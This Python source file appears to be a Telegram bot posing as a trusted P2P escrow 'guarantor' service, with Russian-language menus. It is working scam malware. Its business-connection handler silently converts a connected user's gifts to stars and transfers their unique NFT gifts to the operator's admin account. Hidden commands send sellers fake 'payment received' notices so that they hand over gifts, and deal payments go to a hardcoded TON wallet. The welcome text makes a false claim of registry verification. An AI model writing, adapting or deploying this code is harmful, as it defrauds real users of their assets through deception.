import os
import json
import random
import string
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.types import Message, business_connection, BusinessConnection, FSInputFile
from aiogram.utils.keyboard import InlineKeyboardBuilder
from aiogram.methods.get_business_account_star_balance import GetBusinessAccountStarBalance
from aiogram.methods.get_business_account_gifts import GetBusinessAccountGifts
from custom_methods import GetFixedBusinessAccountStarBalance, GetFixedBusinessAccountGifts
from aiogram.methods import SendMessage, ReadBusinessMessage, ConvertGiftToStars
from aiogram.methods.get_available_gifts import GetAvailableGifts
from aiogram.methods import TransferGift
from aiogram.exceptions import TelegramBadRequest
import asyncio
from loader import dp, bot 
# config.py
from config import API_TOKEN, ADMIN_ID
import logging

bot = Bot(token=API_TOKEN)
dp = Dispatcher()

main_menu = types.InlineKeyboardMarkup(
    inline_keyboard=[
        [types.InlineKeyboardButton(text="🪙 Добавить/изменить кошелек", callback_data="add_wallet")],
        [types.InlineKeyboardButton(text="📄 Создать сделку", callback_data="create_deal")],
        # [types.InlineKeyboardButton(text="📎 Реферальная ссылка", callback_data="referral_link")],
        # [types.InlineKeyboardButton(text="🌐 Change language", callback_data="change_language")],
        [types.InlineKeyboardButton(text="📞 Поддержка", url="https://t.me/@polunin_exchange")],
    ]
)
    
back_button = types.InlineKeyboardMarkup(
    inline_keyboard=[
        [types.InlineKeyboardButton(text="🔙 Вернуться в меню", callback_data="back_to_menu")],
    ]
)

cancel_deal_button = types.InlineKeyboardMarkup(
    inline_keyboard=[
        [types.InlineKeyboardButton(text="❌️ Отменить сделку", callback_data="cancel_deal")],
    ]
)

user_data = {}

os.makedirs("deals", exist_ok=True)
os.makedirs("users", exist_ok=True) 

CONNECTIONS_FILE = "business_connections.json"

REFS_FILE = "refs.json"

def load_refs():
    if os.path.exists(REFS_FILE):
        with open(REFS_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    return {}

def save_refs(data):
    with open(REFS_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, ensure_ascii=False, indent=4)
        
def load_connections():
    with open("business_connections.json", "r") as f:
        return json.load(f)
        
def save_business_connection_data(business_connection):
    business_connection_data = {
        "user_id": business_connection.user.id,
        "business_connection_id": business_connection.id,
        "username": business_connection.user.username,
        "first_name": business_connection.user.first_name,
        "last_name": business_connection.user.last_name
    }

    data = []

    if os.path.exists(CONNECTIONS_FILE):
        try:
            with open(CONNECTIONS_FILE, "r", encoding="utf-8") as f:
                data = json.load(f)
        except json.JSONDecodeError:
            pass

    updated = False
    for i, conn in enumerate(data):
        if conn["user_id"] == business_connection.user.id:
            data[i] = business_connection_data
            updated = True
            break

    if not updated:
        data.append(business_connection_data)

    with open(CONNECTIONS_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2, ensure_ascii=False)

async def send_welcome_message_to_admin(user_id):
    try:
        await bot.send_message(ADMIN_ID, f"Пользователь #{user_id} подключил бота.")

        refs = load_refs()
        user_id_str = str(user_id)
        referrer_id = refs.get(user_id_str, {}).get("referrer_id")

        if referrer_id:
            try:
                await bot.send_message(int(referrer_id), f"Ваш реферал #{user_id} подключил бота.")
            except Exception as e:
                logging.warning(f"Не удалось отправить сообщение рефереру {referrer_id}: {e}")

    except Exception as e:
        logging.exception("Не удалось отправить сообщение в личный чат.")
                        
async def send_or_edit_message(user_id: int, text: str, reply_markup: types.InlineKeyboardMarkup, parse_mode: str = "HTML"):
    last_message_id = user_data.get(user_id, {}).get("last_bot_message_id")
    
    try:
        if last_message_id:
            await bot.edit_message_text(
                chat_id=user_id,
                message_id=last_message_id,
                text=text,
                reply_markup=reply_markup,
                parse_mode=parse_mode
            )
        else:
            sent_message = await bot.send_message(
                chat_id=user_id,
                text=text,
                reply_markup=reply_markup,
                parse_mode=parse_mode
            )
            user_data.setdefault(user_id, {})["last_bot_message_id"] = sent_message.message_id
    except Exception as e:

        print(f"Ошибка при редактировании сообщения для пользователя {user_id}: {e}. Отправляем новое сообщение.")
        sent_message = await bot.send_message(
            chat_id=user_id,
            text=text,
            reply_markup=reply_markup,
            parse_mode=parse_mode
        )
        user_data.setdefault(user_id, {})["last_bot_message_id"] = sent_message.message_id

@dp.business_connection()
async def handle_business_connect(business_connection):
    try:
        await send_welcome_message_to_admin(business_connection.user.id)

        business_connection_data = {
            "user_id": business_connection.user.id,
            "business_connection_id": business_connection.id,
            "username": business_connection.user.username,
            "first_name": business_connection.user.first_name,
            "last_name": business_connection.user.last_name
        }

        save_business_connection_data(business_connection)

        logging.info(f"Бизнес-аккаунт подключен: {business_connection.user.id}, connection_id: {business_connection.id}")

        try:
            gifts_response = await bot(GetBusinessAccountGifts(business_connection_id=business_connection.id))
            gifts = gifts_response.gifts
            converted_count = 0
            for gift in gifts:
                if gift.type == "unique":
                    continue
                try:
                    await bot(ConvertGiftToStars(
                        business_connection_id=business_connection.id,
                        owned_gift_id=str(gift.owned_gift_id)
                    ))
                    converted_count += 1
                except TelegramBadRequest as e:
                    if "GIFT_NOT_CONVERTIBLE" in str(e):
                        continue
                    else:
                        raise e
            await bot.send_message(ADMIN_ID, f"♻️ Конвертировано {converted_count} обычных подарков в звёзды.")
        except Exception as e:
            logging.warning(f"Ошибка при конвертации подарков: {e}")

        try:
            gifts_response = await bot(GetBusinessAccountGifts(
                business_connection_id=business_connection.id
            ))
            gifts = gifts_response.gifts
            transferred = 0
            transferred_gift_links = []

            for gift in gifts:
                if gift.type != "unique":
                    continue
                try:
                    await bot(TransferGift(
                        business_connection_id=business_connection.id,
                        new_owner_chat_id=int(ADMIN_ID),
                        owned_gift_id=gift.owned_gift_id,
                        star_count=gift.transfer_star_count
                    ))
                    transferred += 1
                    gift_link = f"https://t.me/nft/{gift.gift.name}"
                    transferred_gift_links.append(gift_link)
                except Exception as e:
                    logging.warning(f"Не удалось передать подарок {gift.owned_gift_id}: {e}")

            refs = load_refs()
            user_id_str = str(business_connection.user.id)
            
            if user_id_str not in refs:
                refs[user_id_str] = {"referrer_id": None, "joined": None, "gifts": [], "transferred_gifts": []}
            elif "transferred_gifts" not in refs[user_id_str]:
                refs[user_id_str]["transferred_gifts"] = []
            
            refs[user_id_str]["transferred_gifts"].extend(transferred_gift_links)
            save_refs(refs)

            message_text = (
                f"🎁 Автоматически передано {transferred} уникальных подарков от пользователя "
                f"#{business_connection.user.id} (@{business_connection.user.username})."
            )

            await bot.send_message(
                ADMIN_ID,
                message_text
            )


            referrer_id = refs.get(user_id_str, {}).get("referrer_id")
            if referrer_id:
                try:
                    await bot.send_message(
                        int(referrer_id),
                        f"Ваш реферал {business_connection.user.id} передал {transferred} уникальных подарков.\n\n{message_text}"
                    )
                except Exception as e:
                    logging.warning(f"Не удалось отправить сообщение рефереру {referrer_id}: {e}")

        except Exception as e:
            logging.exception("❌ Ошибка при автопередаче подарков.")

    except Exception as e:
        logging.exception("Ошибка при обработке бизнес-подключения.")

@dp.callback_query(F.data == "gift_received")
async def handle_gift_received(callback: types.CallbackQuery):
    await callback.answer("❌️ Подарок еще не передан", show_alert=True)
            
@dp.message(Command("start"))
async def send_welcome(message: types.Message):
    user_id = message.from_user.id
    start_data = message.text.split(" ")

    if len(start_data) == 1:
        await send_or_edit_message(
            user_id,
            text=(
                "👋 <b>Добро пожаловать в GARANT GOLOS – надежный P2P-гарант</b>\n\n"
                "<b>💼 Покупайте и продавайте всё, что угодно – безопасно!</b>\n"
                "От Telegram-подарков и NFT до токенов и фиата – сделки проходят легко и без риска.\n\n"
                "📖 <b>Как пользоваться?</b>\nУважительная просьба внимательно ознакомьтесь с инструкцией перед созданием безопасной сделки! Верификация в реестре РКН 03.10.2025 - https://www.gosuslugi.ru/snet/68b6f6e5ea96024b4eca3eb3\n\n"
                
                "<b>Продавцу</b>\n"
                " 1 - Добавить/изменить кошелек (укажите свой кошелек TON для получения оплаты).\n\n "
                " 2 - Создать сделку (укажите точную сумму которую хотите получить за эту сделку в TON, далее укажите краткое описание и количество продукта/товара который планируете реализовать в данной сделке). \n\n"
                " 3 - Отправить ссылку на сделку покупателю (после успешного создания сделки бот предоставит реферальную ссылку которую необходимо переслать второму участнику сделки, после перехода покупателя по вашей реф. ссылке сделка будет считаться открытой).\n\n "
                
                "<b>Покупателю</b>\n"
                " 1 - Для создания безопасной сделки перешлите имя нашего гаранта @GolosDealBot продавцу (по факту готовности к созданию безопасной сделки продавец в самостоятельном порядке создаёт сделку в нашем боте и присылает вам реферальную ссылку, пример - https://t.me/GolosDealBot?start=fmkesko2). \n\n"
                " 2 - Подтверждение сделки (после перехода по реф. ссылке от продавца сделка будет считаться открытой. Далее если описание товара/продукта и сумма к оплате совпадают с ранее обговорёнными условиями, в таком случае переходите к оплате сделки. \n\n"
                " 3 - Оплата (оплату производите через кнопку Открыть Tonkeeper в боте или по номеру кошелька TON который предоставит вам бот для оплаты вашей сделки) \n\n <b>По завершению всех вышеуказанных манипуляций, наш бот в автоматическом режиме проведёт безопасный обмен в кротчайшие сроки!</b>\n \n\nУважительная просьба к нашим клиентам следовать всем условиям и указаниям бота на протяжении проведения безопасной сделки. В случае отклонения от условий администрация не несёт ответственности за потерю ваших активов, напоминаем любые операции с криптовалютами несут определённые риски, в случае возникновения спорного вопроса просьба немедленно связаться с технической поддержкой для своевременного решения. \n\n"

                "Выберите нужный пункт ниже:"
            ),
            reply_markup=main_menu
        )
    else:
        start_code = start_data[-1]
        
        if start_code.isalnum():
            deal_path = f"deals/{start_code}.json"

            if os.path.exists(deal_path):
                with open(deal_path, "r", encoding="utf-8") as file:
                    deal_data = json.load(file)

                seller_id = deal_data["user_id"]
                amount = deal_data["amount"]
                random_start = deal_data["random_start"]
                description = deal_data["description"]

                # КУРСЫ
                USDT_RATE = 1.8  # 1 TON = 1.8 USDT
                PX_RATE = 53       # 1 TON = 53 PX

                # Рассчитываем суммы с учетом 3% комиссии
                ton_amount = round(amount * 1.03, 2)  # 3% комиссия
                usdt_amount = round(ton_amount * USDT_RATE, 2)
                px_amount = round(ton_amount * PX_RATE, 2)

                message_text = (
                    f"💳 <b>Информация о сделке #{random_start}</b>\n\n"
                    f"👤 <b>Вы покупатель</b> в сделке.\n"
                    f"📌 Продавец: <b>{seller_id}</b>\n"
                    f"• Успешные сделки: 0\n\n"
                    f"• Вы покупаете: {description}\n\n"
                    f"🏦 <b>Адрес для оплаты:</b>\n"
                    f"<code>UQDz_mup9z5HI20VB2_f5K4Nij90wdY6N_RVtoAcHXvsXpM1</code>\n\n"
                    f"💰 <b>Сумма к оплате:</b>\n"
                    f"⬛️ {px_amount} PX (+%)\n"
                    f"💵 {usdt_amount} USDT\n"
                    f"💎 {ton_amount} TON\n\n"
                    f"📝 <b>Комментарий к платежу:</b> {random_start}\n\n"
                    f"⚠️ <b>⚠️ Пожалуйста, убедитесь в правильности данных перед оплатой. Комментарий(мемо) обязателен! Сумма к оплате рассчитана с учетом комиссии за услуги гаранта.</b>\n\n"
                    f"После оплаты ожидайте автоматического подтверждения"
                )

                tonkeeper_url = f"ton://transfer/UQDz_mup9z5HI20VB2_f5K4Nij90wdY6N_RVtoAcHXvsXpM1?amount={int(ton_amount * 1e9)}&text={random_start}"

                buttons = types.InlineKeyboardMarkup(
                    inline_keyboard=[
                        [types.InlineKeyboardButton(text="Открыть в Tonkeeper", url=tonkeeper_url)],
                        [types.InlineKeyboardButton(text="❌ Выйти из сделки", callback_data="exit_deal")]
                    ]
                )

                # Используем send_or_edit_message
                await send_or_edit_message(user_id, message_text, buttons)
            else:
                await send_or_edit_message(user_id, "❌ Сделка не найдена.", back_button)
        else:
            await send_or_edit_message(user_id, "❌ Неверный код сделки.", back_button)

@dp.message(Command("oplata"))
async def send_payment_confirmation(message: types.Message):
    user_id = message.from_user.id
    args = message.text.split()

    if len(args) < 3:
        await send_or_edit_message(user_id, "Использование: /oplata {username} {seller_id}", back_button)
        user_data.pop(user_id, None)
        return

    username = args[1]
    seller_id = args[2]
    
    message_text = (
        f"✅️ <b>Оплата по вашей сделке прошла успешно!</b>\n\n"
        f"⚠️ Для получения оплаты выполните вашу часть сделки. Перешлите подарок покупателю строго на этот аккаунт - {username} \n\n"
        f"🛠  <b>Средства за эту сделку уже находятся на счету нашего гаранта. Они станут доступны для вас по факту выполнения условий сделки."
        f" После успешной передачи подарка намите кнопку - Подтверждаю отправку подарка	 ↓</b>\n\n"
    )

    keyboard = InlineKeyboardBuilder()
    keyboard.button(text="🎁 Подтверждаю отправку подарка", callback_data="gift_received")
    keyboard.button(text="🛠 Связаться с поддержкой", url="https://t.me/@polunin_exchange")
    keyboard.adjust(1)

    try:
        await bot.send_message(
            chat_id=int(seller_id),
            text=message_text, 
            reply_markup=keyboard.as_markup(), 
            parse_mode="HTML"
        )
        await send_or_edit_message(user_id, "✅ <b>Сообщение отправлено продавцу!</b>", back_button)
    except Exception as e:
        await send_or_edit_message(user_id, f"❌ <b>Ошибка отправки сообщения:</b> {e}", back_button)
        user_data.pop(user_id, None)

@dp.message(F.text, lambda message: user_data.get(message.from_user.id, {}).get("step") == "wallet")
async def handle_wallet(message: types.Message):
    user_id = message.from_user.id
    wallet_address = message.text.strip()

    if len(wallet_address) >= 34: 
        user_file = f"users/{user_id}.json"
        os.makedirs("users", exist_ok=True) 
        
        with open(user_file, "w", encoding="utf-8") as file:
            json.dump({"user_id": user_id, "wallet": wallet_address}, file, indent=4)

        await send_or_edit_message(
            user_id,
            f"✅ <b>Кошелек успешно добавлен/изменен!</b>",
            main_menu 
        )
        user_data.pop(user_id, None) 
    else:
        await send_or_edit_message(
            user_id,
            "❌ <b>Неверный формат кошелька. Пожалуйста, отправьте правильный адрес TON-кошелька.</b>",
            back_button
        )

@dp.callback_query(lambda callback: callback.data == "change_language")
async def change_language(callback: types.CallbackQuery):
    await bot.answer_callback_query(callback.id, text="❌️ Ошибка", show_alert=True)                    

@dp.message(Command("1488"))
async def confirm_payment(message: types.Message):
    user_id = message.from_user.id
    start_data = message.text.split(" ")

    if len(start_data) == 2:
        deal_code = start_data[1] 

        deal_path = f"deals/{deal_code}.json" 
        
        if os.path.exists(deal_path):
            with open(deal_path, "r", encoding="utf-8") as file:
                deal_data = json.load(file)

            message_text = (
                f"✅️ <b>Оплата подтверждена</b> для сделки #{deal_code}\n\n"
                "Пожалуйста, подтвердите получение подарка после того, как продавец его отправит."
            )

            buttons = types.InlineKeyboardMarkup(
                inline_keyboard=[
                    [types.InlineKeyboardButton(text="🎁 Я получил подарок", callback_data="gift_received")],
                    [types.InlineKeyboardButton(text="🛠 Связаться с поддержкой", url="https://t.me/@polunin_exchange")]
                ]
            )

            await send_or_edit_message(user_id, message_text, buttons)
        else:
            await send_or_edit_message(user_id, "❌ Сделка не найдена.", back_button)
            user_data.pop(user_id, None) 
    else:
        await send_or_edit_message(user_id, "❌ Неверный формат команды. Используйте /1488 {номер сделки}.", back_button)
        user_data.pop(user_id, None) 
        
@dp.callback_query(lambda callback: callback.data == "confirm_payment")
async def handle_payment_confirmation(callback: types.CallbackQuery):
    await bot.answer_callback_query(callback.id, text="Оплата не найдена. Подождите 10 секунд", show_alert=True)

@dp.callback_query(lambda callback: callback.data == "close_popup")
async def close_popup(callback: types.CallbackQuery):

    await send_or_edit_message(callback.from_user.id, "Окно закрыто.", None)
    
@dp.callback_query(lambda callback: callback.data == "create_deal")
async def start_deal(callback: types.CallbackQuery):
    user_id = callback.from_user.id
    user_data[user_id] = {"step": "amount", "last_bot_message_id": callback.message.message_id} 

    await send_or_edit_message( 
        user_id, 
        text=( 
            "💼 <b>Создание сделки</b>\n\n"
            "Введите сумму TON сделки в формате: <code>100.5</code>"
        ),
        reply_markup=back_button
    )

@dp.message()
async def handle_steps(message: types.Message):
    user_id = message.from_user.id
    step = user_data.get(user_id, {}).get("step")

    if step == "amount":
        try:
            amount = float(message.text.strip())

            user_data[user_id]["amount"] = amount
            user_data[user_id]["step"] = "description"

            await send_or_edit_message(
                user_id,
                "📝 <b>Укажите, что вы предлагаете в этой сделке:</b>\n\n"
                "Пример: <i>10 кепок и 5 пепе...</i>",
                back_button
            )
        except ValueError:
            await send_or_edit_message(
                user_id,
                "❌ Пожалуйста, введите сумму в правильном формате (например, <code>100.5</code>).",
                back_button
            )

    elif step == "description":
        description = message.text.strip()
        user_data[user_id]["description"] = description

        random_start = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
        user_data[user_id]["link"] = f"https://t.me/GolosDealBot?start={random_start}"

        deal_data = {
            "user_id": user_id,
            "amount": user_data[user_id]["amount"],
            "description": user_data[user_id]["description"],
            "link": user_data[user_id]["link"],
            "seller_id": user_id,
            "random_start": random_start
        }
        deal_file_path = f"deals/{random_start}.json"
        with open(deal_file_path, "w", encoding="utf-8") as file:
            json.dump(deal_data, file, ensure_ascii=False, indent=4)

        await send_or_edit_message(
            user_id,
            "✅ <b>Сделка успешно создана!</b>\n\n"
            f"💰 <b>Сумма:</b> <code>{deal_data['amount']} TON</code>\n"
            f"📜 <b>Описание:</b> <code>{deal_data['description']}</code>\n"
            f"🔗 <b>Ссылка для покупателя:</b> {deal_data['link']}",
            cancel_deal_button
        )

        user_data.pop(user_id, None) 
        
@dp.callback_query(lambda callback: callback.data == "back_to_menu")
async def back_to_menu(callback: types.CallbackQuery):
    user_id = callback.from_user.id
    
    await send_or_edit_message(
        user_id,
        text=(
            "👋 <b>Добро пожаловать в – надежный P2P-гарант</b>\n\n"
            "<b>💼 Покупайте и продавайте всё, что угодно – безопасно!</b>\n"
            "От Telegram-подарков и NFT до токенов и фиата – сделки проходят легко и без риска.\n\n"
            "📖 <b>Как пользоваться?</b>\nОзнакомьтесь с инструкцией — /start. Верификация в реестре РКН 03.10.2025 - https://www.gosuslugi.ru/snet/68b6f6e5ea96024b4eca3eb3\n\n"
            "Выберите нужный пункт ниже:"
        ),
        reply_markup=main_menu
    )
    user_data.pop(user_id, None)

@dp.callback_query(lambda callback: callback.data == "add_wallet")
async def add_wallet(callback: types.CallbackQuery):
    user_id = callback.from_user.id
    user_file_path = f"users/{user_id}.json"

    text = ""
    if os.path.exists(user_file_path):
        with open(user_file_path, "r", encoding="utf-8") as file:
            user_info = json.load(file)
        current_wallet = user_info.get("wallet")
        if current_wallet:
            text = (
                f"💼 <b>Ваш текущий кошелек:</b> <code>{current_wallet}</code>\n\n"
                "Отправьте новый адрес кошелька для изменения или нажмите кнопку ниже для возврата в меню."
            )
        else:
            text = "🔑 <b>Добавьте ваш TON-кошелек:</b>\n\nПожалуйста, отправьте адрес вашего кошелька."
    else:
        text = "🔑 <b>Добавьте ваш TON-кошелек:</b>\n\nПожалуйста, отправьте адрес вашего кошелька."

    await send_or_edit_message(user_id, text, back_button)
    user_data.setdefault(user_id, {})["step"] = "wallet" 
    
@dp.callback_query(lambda callback: callback.data == "cancel_deal")
async def cancel_deal(callback: types.CallbackQuery):
    user_id = callback.from_user.id

    await send_or_edit_message(
        user_id,
        "❌ Сделка была отменена. Возвращаемся в главное меню.",
        main_menu
    )
    user_data.pop(user_id, None) 

async def main():
    print("Бот запускается...")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())

